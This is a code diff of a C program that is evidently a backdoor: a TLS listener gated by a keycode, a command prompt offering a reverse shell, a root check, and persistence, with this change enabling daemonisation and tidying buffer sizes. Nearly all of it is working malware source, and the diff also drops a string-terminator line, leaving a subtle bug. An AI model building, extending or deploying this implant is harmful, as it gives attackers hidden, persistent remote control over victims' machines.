@@ -9,17 +9,15 @@ int handle_recv(SSL *ssl) {
 
     while (1) {
         SSL_write(ssl, "$> ", 3);
-        memset(buffer, 0, 1024);
-        memset(response, 0, 1024);
+        memset(buffer, 0, sizeof(buffer));
+        memset(response, 0, sizeof(response));
         size_t valread;
         if (!SSL_read_ex(ssl, buffer, sizeof(buffer) - 1, &valread) || valread <= 0)
             break;
-        buffer[valread] = '\0';
-
         if (!strncmp(buffer, "quit", 4))
             break;
         if (!strncmp(buffer, "help", 4) || !strncmp(buffer, "?", 1)) {
-           snprintf(response, 1024,
+           snprintf(response, sizeof(response),
                 "Help:\n"
                 "  shell   - Get a reverse shell\n"
                 "  quit    - Exit\n");
@@ -45,9 +43,9 @@ void *handle_client(void *arg) {
     int ssl_read_err = 0;
 
     while (1) {
-        memset(buffer, 0, 1024);
-        memset(response, 0, 1024);
-        snprintf(response, 1024, "%s", "Enter the keycode: ");
+        memset(buffer, 0, sizeof(buffer));
+        memset(response, 0, sizeof(response));
+        snprintf(response, sizeof(response), "%s", "Enter the keycode: ");
         SSL_write(args->ssl, response, strlen(response));
         size_t valread;
 
@@ -59,14 +57,14 @@ void *handle_client(void *arg) {
         if (valread <= 0)
             break;
         if (check_pwd((unsigned char *)buffer, valread - 1)) {
-            snprintf(response, 1024, "%s", "Connection established, welcome\n");
+            snprintf(response, sizeof(response), "%s", "Connection established, welcome\n");
             SSL_write(args->ssl, response, strlen(response));
             if (handle_recv(args->ssl)) {
                 break;
             }
             
         } else {
-            snprintf(response, 1024, "%s", "Connection failed\n");
+            snprintf(response, sizeof(response), "%s", "Connection failed\n");
             SSL_write(args->ssl, response, strlen(response));
         }
     }
@@ -141,7 +139,7 @@ int main(int ac, char **av) {
         fprintf(stderr, "Error: this program must be run as root.\n");
         return 1;
     }
-    // create_daemon();
+    create_daemon();
     set_persistence();
     pthread_t thread_id;
     
